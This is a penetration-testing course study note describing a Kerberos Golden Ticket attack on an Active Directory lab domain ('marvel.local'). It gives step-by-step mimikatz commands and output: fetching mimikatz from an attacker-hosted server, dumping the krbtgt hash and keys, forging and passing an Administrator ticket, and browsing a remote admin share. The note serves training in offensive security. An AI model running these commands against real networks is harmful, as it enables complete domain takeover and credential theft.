
## Quick-Use

**Commands**:
- get the lsadump needed
```powershell
mimikatz: privilege::debug
mimikatz: lsadump::lsa /inject /name:krbtgt
```

- generate and pass ticket (the /ptt command)
```powershell
mimikatz: kerberos::golden /User:Administrator /domain:domain.name /sid:a-1-2-13-1231242352-1231234235234-123123123123 /krbtgt:asdfjkl1234jklasdf /id:500 /ptt
```

See [[#Examples]] for full attack example

*Tools*:
- [[2_Studies/Courses/Current/CERTPREP - PJPT-Practical Jr Pen Tester/Practical Ethical Hacking/3_Exploitation/Post-Compromise Exploitation/Mimikatz]] - generates krbtgt and generates the Golden Ticket

## General

**Objectives**:

First, we need this from an LSA dump from the KRBTGT account:
- Domain SID
- KRBTGT NTLM hash
From there, the Golden ticket can be generated and passed

**Overview**:
If the Kerberos Ticket Granting Ticket (KRBTGT) is owned, then the domain is owned. Therefore you can request access to any resource or system on the domain.

Such tickets are called *Golden Tickets*

## Examples

Get and prep payload:
```shell
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Downloads

C:\Users\Administrator\Downloads>curl http://192.168.109.128:8000/mimikatz_x64.zip

C:\Users\Administrator\Downloads>tar xf mimikatz_x64.zip
```

Start `mimikatz` and run `lsadump`
```shell
C:\Users\Administrator\Downloads>mimikatz.exe

.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

```

First needed bit of info: `Domain : SID`
```shell

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : MARVEL / S-1-5-21-1632067324-480198821-1859553728   # <- SID IS HERE

```

Next bit of information: `NTLM : HASH`
```shell
RID  : 000001f6 (502)
User : krbtgt

* Primary
  NTLM : 49a5286819887de3ea2e3fb849ad4f4d     # <- NTLM hash is here
  LM   :
  Hash NTLM: 49a5286819887de3ea2e3fb849ad4f4d
  ntlm- 0: 49a5286819887de3ea2e3fb849ad4f4d
  lm  - 0: ba5c3d55c416d2b800ee92ab2a72ff3d
```

Continued output from command...
```
* WDigest
  01  4a9d8c4813b63691eafc11150e57719d
  02  e64f5c2b7d855dbb438928d66e4bc3cb
  03  adb535f6017f8d4a4b0f264115aedc03
  04  4a9d8c4813b63691eafc11150e57719d
  05  e64f5c2b7d855dbb438928d66e4bc3cb
  06  5d59daf0f7247bc7950c6fe29c9621f3
  07  4a9d8c4813b63691eafc11150e57719d
  08  55dd2730e963f5ff38a5f0382c6c231b
  09  34f676080ccdff5b868a240dc292ed17
  10  ff3a709789c9c27eb533c21b0f90635d
  11  7fb812aa3b13298971dcdf70c7fd5efa
  12  34f676080ccdff5b868a240dc292ed17
  13  9f7b712a2b3cc5f9b67232fbb6d172b7
  14  7fb812aa3b13298971dcdf70c7fd5efa
  15  f910253817dfddde8cf1a61631aa0c00
  16  da364bba1af8187e6d8b0b756cbdef66
  17  b164d0107c8bf2a20f2246f094a8f4f1
  18  ab082e6a499906880b8c4e5731399e14
  19  b5bc9996041f6ab0931d47077002f83f
  20  c7b8a8cc60355b1adc347254b065f13b
  21  15b6cc556de295e6d0c89a87e60d1a40
  22  15b6cc556de295e6d0c89a87e60d1a40
  23  468c27f521c3a2bd9b64531107c9f3f3
  24  800a92159a360f0e330c767b99b79205
  25  a2c47a8d0b37b91a49e4adb410d0bddd
  26  a60b85171dfbffcf1815e054bba3767c
  27  13e2ca2a0f6e5b54aef67d89c2face2c
  28  f03735db8d11048cfce713b357a635e8
  29  a941f63fe7eaeb94d634eca0411b3e08

* Kerberos
  Default Salt : MARVEL.LOCALkrbtgt
  Credentials
    des_cbc_md5       : 2a4fb94cdc7557d9

* Kerberos-Newer-Keys
  Default Salt : MARVEL.LOCALkrbtgt
  Default Iterations : 4096
  Credentials
    aes256_hmac       (4096) : d9ea24dd785afabfde155ddb0061489d427589a376509b2486520a06eb37d4d2
    aes128_hmac       (4096) : a791e15c5c06f92817bc34b2ea26a7a0
    des_cbc_md5       (4096) : 2a4fb94cdc7557d9

* NTLM-Strong-NTOWF
  Random Value : 8d39a54f10ca861aa439ea752161cf02
```

Now running the Pass-the-Ticket attack, `mimikatz /ptt` with the collected info from above, and it runs successfully:
```
mimikatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1632067324-480198821-1859553728 /krbtgt:49a5286819887de3ea2e3fb849ad4f4d /id:500 /ptt
User      : Administrator
Domain    : marvel.local (MARVEL)
SID       : S-1-5-21-1632067324-480198821-1859553728
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 49a5286819887de3ea2e3fb849ad4f4d - rc4_hmac_nt
Lifetime  : 11/24/2025 11:35:25 AM ; 11/22/2035 11:35:25 AM ; 11:22/2035 11:35:25 AM
-> Ticket : ** Pass The Ticket **

* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated

Golden ticket for 'Administrator @ marvel.local' successfully submitted for current session
```

Using the ticket made to spawn a CMD shell:
```shell
mimikatz # misc::cmd 
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF78FE5B800

```

Newly spawned shell:
```shell
C:\Users\Administrator\Downloads>dir \\THEPUNISHER\c$
Volume in drive \\THEPUNISHER\c$ has no label.
Volume Serial Number is F408-8A7B

Directory of \\THEPUNISHER\c$

11/07/2025  02:51 PM    <DIR>          inetpub
12/07/2019  01:14 AM    <DIR>          PerfLogs
11/06/2025  04:39 PM    <DIR>          Program Files
10/06/2021  05:58 AM    <DIR>          Program Files (x86)
11/09/2025  11:15 AM    <DIR>          Users
11/13/2025  09:28 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  38,288,441,344 bytes free

C:\Users\Administrator\Downloads>
```

## Glossary